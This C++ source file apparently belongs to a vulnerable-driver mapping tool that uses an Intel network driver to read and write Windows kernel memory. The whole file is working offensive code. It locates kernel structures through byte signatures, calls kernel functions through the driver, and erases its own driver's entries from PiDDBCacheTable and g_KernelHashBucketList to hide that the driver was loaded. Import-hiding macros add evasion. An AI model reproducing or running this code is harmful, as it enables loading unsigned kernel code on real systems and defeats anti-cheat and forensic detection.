PVOID intel_driver::ResolveRelativeAddress( HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize ) {
	ULONG_PTR Instr = ( ULONG_PTR )Instruction;
	LONG RipOffset = 0;
	if ( !ReadMemory( device_handle, Instr + OffsetOffset, &RipOffset, sizeof( LONG ) ) ) {
		return nullptr;
	}
	PVOID ResolvedAddr = ( PVOID )( Instr + InstructionSize + RipOffset );
	return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite( HANDLE device_handle, PVOID Resource, BOOLEAN wait ) {
	if ( !Resource )
		return 0;

	static uint64_t kernel_ExAcquireResourceExclusiveLite = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite" );

	if ( !kernel_ExAcquireResourceExclusiveLite ) {
		no_iat( wprintf )( L"[!] Failed to find ExAcquireResourceExclusiveLite\n" );
		return 0;
	}

	BOOLEAN out;

	return ( CallKernelFunction( device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait ) && out );
}

bool intel_driver::ExReleaseResourceLite( HANDLE device_handle, PVOID Resource ) {
	if ( !Resource )
		return false;

	static uint64_t kernel_ExReleaseResourceLite = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite" );

	if ( !kernel_ExReleaseResourceLite ) {
		no_iat( wprintf )( L"[!] Failed to find ExReleaseResourceLite\n" );
		return false;
	}

	return CallKernelFunction<void>( device_handle, nullptr, kernel_ExReleaseResourceLite, Resource );
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl( HANDLE device_handle, PVOID Table, PVOID Buffer ) {
	if ( !Table )
		return false;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl" );

	if ( !kernel_RtlDeleteElementGenericTableAvl ) {
		no_iat( wprintf )( L"[!] Failed to find RtlDeleteElementGenericTableAvl\n" );
		return false;
	}

	bool out;
	return ( CallKernelFunction( device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer ) && out );
}

PVOID intel_driver::RtlLookupElementGenericTableAvl( HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer ) {
	if ( !Table )
		return nullptr;

	static uint64_t kernel_RtlDeleteElementGenericTableAvl = GetKernelModuleExport( device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl" );

	if ( !kernel_RtlDeleteElementGenericTableAvl ) {
		no_iat( wprintf )( L"[!] Failed to find RtlLookupElementGenericTableAvl\n" );
		return nullptr;
	}

	PVOID out;

	if ( !CallKernelFunction( device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer ) )
		return 0;

	return out;
}


intel_driver::PiDDBCacheEntry* intel_driver::LookupEntry( HANDLE device_handle, PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name ) {

	PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = ( PWSTR )name;
	localentry.DriverName.Length = ( USHORT )( wcslen( name ) * 2 );
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

	return ( PiDDBCacheEntry* )RtlLookupElementGenericTableAvl( device_handle, PiDDBCacheTable, ( PVOID )&localentry );
}

bool intel_driver::ClearPiDDBCacheTable( HANDLE device_handle ) { //PiDDBCacheTable added on LoadDriver

	PiDDBLockPtr = FindPatternInSectionAtKernel( device_handle, "PAGE", intel_driver::ntoskrnlAddr, ( PUCHAR )"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x" ); // 8B D8 85 C0 0F 88 ? ? ? ? 65 48 8B 04 25 ? ? ? ? 66 FF 88 ? ? ? ? B2 01 48 8D 0D ? ? ? ? E8 ? ? ? ? 4C 8B ? 24 update for build 22000.132
	PiDDBCacheTablePtr = FindPatternInSectionAtKernel( device_handle, "PAGE", intel_driver::ntoskrnlAddr, ( PUCHAR )"\x66\x03\xD2\x48\x8D\x0D", "xxxxxx" ); // 66 03 D2 48 8D 0D

	if ( PiDDBLockPtr == NULL ) { // PiDDBLock pattern changes a lot from version 1607 of windows and we will need a second pattern if we want to keep simple as posible
		PiDDBLockPtr = FindPatternInSectionAtKernel( device_handle, "PAGE", intel_driver::ntoskrnlAddr, ( PUCHAR )"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", "xxx????xxxxx????xxx????x????x" ); // 48 8B 0D ? ? ? ? 48 85 C9 0F 85 ? ? ? ? 48 8D 0D ? ? ? ? E8 ? ? ? ? E8 build 22449+ (pattern can be improved but just fine for now)
		if ( PiDDBLockPtr == NULL ) {
			no_iat( wprintf )( L"[-] Warning PiDDBLock not found\n" );
			return false;
		}
		no_iat( wprintf )( L"[+] found lock gadget\n" );
		PiDDBLockPtr += 16; //second pattern offset
	}
	else {
		PiDDBLockPtr += 28; //first pattern offset
	}

	if ( PiDDBCacheTablePtr == NULL ) {
		no_iat( wprintf )( L"[+] fatal error 65\n" );
		return false;
	}
	PVOID PiDDBLock = ResolveRelativeAddress( device_handle, ( PVOID )PiDDBLockPtr, 3, 7 );
	PRTL_AVL_TABLE PiDDBCacheTable = ( PRTL_AVL_TABLE )ResolveRelativeAddress( device_handle, ( PVOID )PiDDBCacheTablePtr, 6, 10 );

	//context part is not used by lookup, lock or delete why we should use it?

	if ( !ExAcquireResourceExclusiveLite( device_handle, PiDDBLock, true ) ) {
		no_iat( wprintf )( L"[+] fatal error 15\n" );
		return false;
	}

	auto n = GetDriverNameW( );

	// search our entry in the table
	PiDDBCacheEntry* pFoundEntry = ( PiDDBCacheEntry* )LookupEntry( device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str( ) );
	if ( pFoundEntry == nullptr ) {
		no_iat( wprintf )( L"[+] fatal error 32\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}

	// first, unlink from the list
	PLIST_ENTRY prev;
	if ( !ReadMemory( device_handle, ( uintptr_t )pFoundEntry + ( offsetof( struct _PiDDBCacheEntry, List.Blink ) ), &prev, sizeof( _LIST_ENTRY* ) ) ) {
		no_iat( wprintf )( L"[+] fatal error 77\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}
	PLIST_ENTRY next;
	if ( !ReadMemory( device_handle, ( uintptr_t )pFoundEntry + ( offsetof( struct _PiDDBCacheEntry, List.Flink ) ), &next, sizeof( _LIST_ENTRY* ) ) ) {
		no_iat( wprintf )( L"[-] error #187\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}
	 
	if ( !WriteMemory( device_handle, ( uintptr_t )prev + ( offsetof( struct _LIST_ENTRY, Flink ) ), &next, sizeof( _LIST_ENTRY* ) ) ) {
		no_iat( wprintf )( L"[-] Can't set next entry\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}
	if ( !WriteMemory( device_handle, ( uintptr_t )next + ( offsetof( struct _LIST_ENTRY, Blink ) ), &prev, sizeof( _LIST_ENTRY* ) ) ) {
		no_iat( wprintf )( L"[-] Can't set prev entry\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}

	// then delete the element from the avl table
	if ( !RtlDeleteElementGenericTableAvl( device_handle, PiDDBCacheTable, pFoundEntry ) ) {
		no_iat( wprintf )( L"[-] Can't delete from PiDDBCacheTable\n" );
		ExReleaseResourceLite( device_handle, PiDDBLock );
		return false;
	}

	//Decrement delete count
	ULONG cacheDeleteCount = 0;
	ReadMemory( device_handle, ( uintptr_t )PiDDBCacheTable + ( offsetof( struct _RTL_AVL_TABLE, DeleteCount ) ), &cacheDeleteCount, sizeof( ULONG ) );
	if ( cacheDeleteCount > 0 ) {
		cacheDeleteCount--;
		WriteMemory( device_handle, ( uintptr_t )PiDDBCacheTable + ( offsetof( struct _RTL_AVL_TABLE, DeleteCount ) ), &cacheDeleteCount, sizeof( ULONG ) );
	}

	// release the ddb resource lock
	ExReleaseResourceLite( device_handle, PiDDBLock );

	no_iat( wprintf )( L"[+] erased 1st path\n" );

	return true;
}

uintptr_t intel_driver::FindPatternAtKernel( HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask ) {
	if ( !dwAddress ) {
		no_iat( wprintf )( L"[-] No module address to find pattern\n" );
		return 0;
	}

	if ( dwLen > 1024 * 1024 * 1024 ) { //if read is > 1GB
		no_iat( wprintf )( L"[-] Can't find pattern, Too big section\n" );
		return 0;
	}

	auto sectionData = std::make_unique<BYTE[]>( dwLen );
	if ( !ReadMemory( device_handle, dwAddress, sectionData.get( ), dwLen ) ) {
		no_iat( wprintf )( L"[-] Read failed in FindPatternAtKernel\n" );
		return 0;
	}

	char* mutable_mask = const_cast<char*>( szMask ); // risku DOES indeed know his casts

	auto result = utils::FindPattern( ( uintptr_t )sectionData.get( ), dwLen, bMask, mutable_mask );

	if ( result <= 0 ) {
		no_iat( wprintf )( L"[-] Can't find pattern\n" );
		return 0;
	}
	result = dwAddress - ( uintptr_t )sectionData.get( ) + result;
	return result;
}

uintptr_t intel_driver::FindSectionAtKernel( HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, PULONG size ) {
	if ( !modulePtr )
		return 0;
	BYTE headers[0x1000];
	if ( !ReadMemory( device_handle, modulePtr, headers, 0x1000 ) ) {
		no_iat( wprintf )( L"[-] Can't read module headers\n" );
		return 0;
	}
	ULONG sectionSize = 0;
	char* mutable_mask = const_cast< char* >( sectionName ); // risku DOES indeed know his casts

	uintptr_t section = ( uintptr_t )utils::FindSection( mutable_mask, ( uintptr_t )headers, &sectionSize );
	if ( !section || !sectionSize ) {
		no_iat( wprintf )( L"[-] Can't find section\n" );
		return 0;
	}
	if ( size )
		*size = sectionSize;
	return section - ( uintptr_t )headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel( HANDLE device_handle, const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask ) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel( device_handle, sectionName, modulePtr, &sectionSize );
	return FindPatternAtKernel( device_handle, section, sectionSize, bMask, szMask );
}

bool intel_driver::ClearKernelHashBucketList( HANDLE device_handle ) {
	uint64_t ci = utils::GetKernelModuleAddress( "ci.dll" );
	if ( !ci ) {
		no_iat( wprintf )( L"[-] Can't Find ci.dll module address\n" );
		return false;
	}

	//Thanks @KDIo3 and @Swiftik from UnknownCheats
	auto sig = FindPatternInSectionAtKernel( device_handle, "PAGE", ci, PUCHAR( "\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00" ), "xxx????x?xxxxxxx" );
	if ( !sig ) {
		no_iat( wprintf )( L"[-] Can't Find g_KernelHashBucketList\n" );
		return false;
	}
	auto sig2 = FindPatternAtKernel( device_handle, ( uintptr_t )sig - 50, 50, PUCHAR( "\x48\x8D\x0D" ), "xxx" );
	if ( !sig2 ) {
		no_iat( wprintf )( L"[-] Can't Find g_HashCacheLock\n" );
		return false;
	}
	const auto g_KernelHashBucketList = ResolveRelativeAddress( device_handle, ( PVOID )sig, 3, 7 );
	const auto g_HashCacheLock = ResolveRelativeAddress( device_handle, ( PVOID )sig2, 3, 7 );
	if ( !g_KernelHashBucketList || !g_HashCacheLock )
	{
		no_iat( wprintf )( L"[-] Can't Find g_HashCache relative address\n" );
		return false;
	}

	if ( !ExAcquireResourceExclusiveLite( device_handle, g_HashCacheLock, true ) ) {
		no_iat( wprintf )( L"[-] Can't lock g_HashCacheLock\n" );
		return false;
	}

	HashBucketEntry* prev = ( HashBucketEntry* )g_KernelHashBucketList;
	HashBucketEntry* entry = 0;
	if ( !ReadMemory( device_handle, ( uintptr_t )prev, &entry, sizeof( entry ) ) ) {
		no_iat( wprintf )( L"[-] Failed to read first g_KernelHashBucketList entry!\n" );
		if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
			no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
		}
		return false;
	}
	if ( !entry ) {
		no_iat( wprintf )( L"[!] g_KernelHashBucketList looks empty!\n" );
		if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
			no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
		}
		return true;
	}

	std::wstring wdname = GetDriverNameW( );
	std::wstring search_path = GetDriverPath( );
	SIZE_T expected_len = ( search_path.length( ) - 2 ) * 2;

	while ( entry ) {

		USHORT wsNameLen = 0;
		if ( !ReadMemory( device_handle, ( uintptr_t )entry + offsetof( HashBucketEntry, DriverName.Length ), &wsNameLen, sizeof( wsNameLen ) ) || wsNameLen == 0 ) {
			no_iat( wprintf )( L"[-] Failed to read g_KernelHashBucketList entry text len!\n" );
			if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
				no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
			}
			return false;
		}

		if ( expected_len == wsNameLen ) {
			wchar_t* wsNamePtr = 0;
			if ( !ReadMemory( device_handle, ( uintptr_t )entry + offsetof( HashBucketEntry, DriverName.Buffer ), &wsNamePtr, sizeof( wsNamePtr ) ) || !wsNamePtr ) {
				no_iat( wprintf )( L"[-] Failed to read g_KernelHashBucketList entry text ptr!\n" );
				if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
					no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
				}
				return false;
			}

			auto wsName = std::make_unique<wchar_t[]>( ( ULONG64 )wsNameLen / 2ULL + 1ULL );
			if ( !ReadMemory( device_handle, ( uintptr_t )wsNamePtr, wsName.get( ), wsNameLen ) ) {
				no_iat( wprintf )( L"[-] Failed to read g_KernelHashBucketList entry text!\n" );
				if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
					no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
				}
				return false;
			}

			size_t find_result = std::wstring( wsName.get( ) ).find( wdname );
			if ( find_result != std::wstring::npos ) {
				HashBucketEntry* Next = 0;
				if ( !ReadMemory( device_handle, ( uintptr_t )entry, &Next, sizeof( Next ) ) ) {
					no_iat( wprintf )( L"[-] Failed to read g_KernelHashBucketList next entry ptr!\n" );
					if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
						no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
					}
					return false;
				}

				if ( !WriteMemory( device_handle, ( uintptr_t )prev, &Next, sizeof( Next ) ) ) {
					no_iat( wprintf )( L"[-] Failed to write g_KernelHashBucketList prev entry ptr!\n" );
					if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
						no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
					}
					return false;
				}

				if ( !FreePool( device_handle, ( uintptr_t )entry ) ) {
					no_iat( wprintf )( L"[-] Failed to clear g_KernelHashBucketList entry pool!\n" );
					if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
						no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
					}
					return false;
				}
				no_iat( wprintf )( L"[+] erased 2nd path\n" );
				if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
					no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
					if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
						no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
					}
					return false;
				}
				return true;
			}
		}
		prev = entry;
		//read next
		if ( !ReadMemory( device_handle, ( uintptr_t )entry, &entry, sizeof( entry ) ) ) {
			no_iat( wprintf )( L"[-] Failed to read g_KernelHashBucketList next entry!\n" );
			if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
				no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
			}
			return false;
		}
	}

	if ( !ExReleaseResourceLite( device_handle, g_HashCacheLock ) ) {
		no_iat( wprintf )( L"[-] Failed to release g_KernelHashBucketList lock!\n" );
	}
	return false;
}